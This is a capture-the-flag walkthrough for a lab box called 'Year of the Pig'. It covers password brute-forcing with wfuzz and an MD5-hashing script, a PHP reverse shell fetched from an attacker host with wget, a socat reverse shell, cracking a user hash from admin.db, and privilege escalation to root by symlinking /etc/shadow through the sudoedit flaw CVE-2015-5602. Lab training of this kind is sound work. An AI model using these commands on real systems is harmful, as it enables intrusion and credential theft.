# Year of the Pig

*Some pigs do fly...*

### Walkthrough

Initial Nmap scan:

```
$ nmap -sC -sV -T4 -p- <victim_ip>
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 18:36 BST
Nmap scan report for <victim_ip>
Host is up (0.080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Marco's Blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.01 seconds
```

```
$ gobuster dir -u http://<victim_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<victim_ip>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/23 18:45:36 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://<victim_ip>/admin/]
/assets               (Status: 301) [Size: 313] [--> http://<victim_ip>/assets/]
/css                  (Status: 301) [Size: 310] [--> http://<victim_ip>/css/]
/js                   (Status: 301) [Size: 309] [--> http://<victim_ip>/js/]
/api                  (Status: 301) [Size: 310] [--> http://<victim_ip>/api/]
Progress: 87600 / 87665 (99.93%)
===============================================================
2023/07/23 18:51:18 Finished
===============================================================
```

Navigating to the web page:

![[Pasted image 20230723195043.png]]

Admin page:

![[Pasted image 20230723214327.png]]

When we make an incorrect form submission:

![[Pasted image 20230723234127.png]]

We then use CeWL to extract words from the homepage in order to craft a password list:

```console
$ cewl http://<victim_ip>/ > password_list
```

We can then amend John The Ripper using mutations and comment out every rule within `[List.Rules:Wordlist]`. as follows:

```console
$ sudo vim /etc/john/john.conf
...
# Wordlist mode rules
[List.Rules:Wordlist]
# Try words as they are
:
# Lowercase every pure alphanumeric word
-c >3 !?X l Q
# Capitalize every pure alphanumeric word
-c (?a >2 !?X c Q
...
```

We can then user `john` to put our password list into an acceptable format:

```console
$ john -w=password_list --rules --stout > formatted_list
```

Finally, we add a rule of our own, such that:

```
$[0-9]$[0-9]$[!.?,]
```

This will add two numbers and a special character to every word in the list, as per the password policy outlined in the `/admin` page. We then run `john` to produce our finalised list:

```console
$ john -w=formatted_list --rules --stout > final_list
```

Analysing the request that is sent to the website when the user submits the login form shows the password is hashed with MD5 before submitted:

![[Pasted image 20230725202251.png]]

The response is then returned as follows:

![[Pasted image 20230725202359.png]]

From the above, there are two things of note. Firstly, the HTTP response code is `200 OK`, meaning we cannot reliably use the response code for a successful login. Secondly, the `Content-Length` field is `63` and is consistent across other failed requests, meaning we could use this to distinguish between a failed and successful login.

We can then write a Python script to take in our password list, and compute the MD5 hash of each, which we can then use to submit to the page:

```python
#!/usr/bin/env python3

import sys
import hashlib

PASSWORD_LIST = 'password_list/final.lst'
HASHED_LIST = 'password_list/hashed.lst'

def compute_hash(password: str) -> str:
	'''
	Given a string, compute the MD5 hash and return it

	Parameters:
		password (str): plaintext password to be hashed

	Returns:
		password_hash (str): MD5 hash of the password
	'''
	password_hash = hashlib.md5(password.encode())
	return password_hash.hexdigest()


def main():
	with open(PASSWORD_LIST, 'r') as f:
		password_list = [x.strip() for x in f.readlines()]

	with open(HASHED_LIST, 'w') as f:
		for p in password_list:
			md5 = compute_hash(p)
			f.write(f'{md5}\n')


# driver code
if __name__ == '__main__':
	try:
		main()
	except Exception as err:
		print(err)
		sys.exit(1)

```

We can then use `wfuzz` to brute force the `marco` user's password:

```console
$ wfuzz -w password_list/hashed.lst -H 'User-Agent: Bruteforce' -X POST -d '{"username":"marco","password":"FUZZ"}' -u http://10.10.163.4/api/login --hh 63
```

![[Pasted image 20230727224556.png]]

Command-line summary:
- `-w`: use the `password_list/hashed.lst` wordlist
- `-H`: set custom user-agent
- `-X`: send `HTTP POST` requests
- `-d`: send JSON data, fuzzing the `password` parameter
- `-u`: set the URL to Marco's blog
- `--hh`: hide responses with `63` bytes

We can then view which line the password is on with `sed`:

```console
$ sed -n '<line_number>p' password_list/final.lst 
```

![[Pasted image 20230727224958.png]]

Using this password on the login page brings us to an admin dashboard:

![[Pasted image 20230727225614.png]]

We have various functions on the side-bar. One of which `DELETE USER` identifies an additional user, `curtis`:

![[Pasted image 20230727225718.png]]

Unfortunately, this section turns out to be a rabbit hole. However, from our initial nmap scan, we also identified an SSH service on port 22 which we can access with the `marco` user's credentials:

![[Pasted image 20230727231409.png]]

We also retrieve the flag:

![[Pasted image 20230727231450.png]]

Manually enumerating the machine, we see within `/var/www` contains the web files for Marco's blog. However, they can only be accessed by the `www-data` user:

![[Pasted image 20230728100937.png]]

As we have access to the box via SSH, we can upload a PHP reverse shell to the path `/var/www/html`. We can then navigate to this shell in the browser and become `www-data` as that is the user that operates the website.

Using the PentestMonkey PHP reverse shell (`/usr/share/webshells/php/php-reverse-shell.php`) and changing the IP and port variables to our machine:

![[Pasted image 20230728101537.png]]

We then create a listener with netcat (`nc`) to catch the callback connection with the port above:

```console
$ nc -nvlp <port>
```

Finally, we upload the shell to the victim host via `python3` and `wget`:

Attacker machine (in directory of reverse shell):

```console
$ python3 -m http.server <port>
```

Victim machine (in `/var/www/html`):

```console
$ wget http://<attacker_ip>:<port>/shell.php
```

![[Pasted image 20230728101954.png]]

We can then access this in the browser and catch the callback connection in netcat:

![[Pasted image 20230728102152.png]]

Stabilise our shell:

```console
$ python3 -c "import pty;pty.spawn('/bin/bash')"
$ export TERM=xterm
```

We can now read the contents of the `admin.db` file, however we will need to upgrade to an interactive shell. We can accomplish this via `socat`, uploading a [static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) the same way we uploaded our reverse shell

Attacker machine:

```console
$ socat tcp-l:<port> file:`tty`,raw,echo=0
```

Target machine:

```console
$ chmod +x socat
$ socat tcp:<attacker_ip>:<port> exec:"bash -li",pty,stderr,sigint,setside,sane
```

This results in a fully-interactive shell as `www-data`:

![[Pasted image 20230728103128.png]]

We can then read the `admin.db` via `sqlite3`:

![[Pasted image 20230728103531.png]]

We then use [CrackStation](https://crackstation.net) to crack the MD5 password hash of the `curtis` user:

![[Pasted image 20230728103756.png]]

With these credentials, we use `su` to switch to `curtis` and retrieve flag 2:

![[Pasted image 20230728104014.png]]

Checking `sudo -l`, we see `curtis` can run the following:

```
sudoedit /var/www/html/*/*/config.php
```

With the current version of `sudo` (`v1.8.13`), it is vulnerable to [CVE-2015-5602](https://www.exploit-db.com/exploits/37710). To exploit this, we must create two directories within `/var/www/html` and create a `config.php` file in that subdirectory.  We cannot do this with `curtis` as they are not a member of the `web-developers` group - only `marco` and `www-html` can do this:

```console
$ mkdir -p /var/www/html/priv/esc
$ touch /var/www/html/priv/esc/config.php
```

We can then create a symlink to another file, such as `/etc/shadow`, which will allow us to edit it with `root` user privileges:

```console
$ ln -s /etc/shadow /var/www/html/priv/esc/config.php
```

Switching back to `curtis`, we can then run `sudoedit`

![[Pasted image 20230728122940.png]]



![[Pasted image 20230728122450.png]]

From here, we can then change the `root` password:

Attacker machine:

```console
$ openssl passwd -6 -salt randomsalt <password>
```

Pasting this value in place of the current `root` password, we can `su` to `root` and retrieve the final flag:

![[Pasted image 20230728122725.png]]
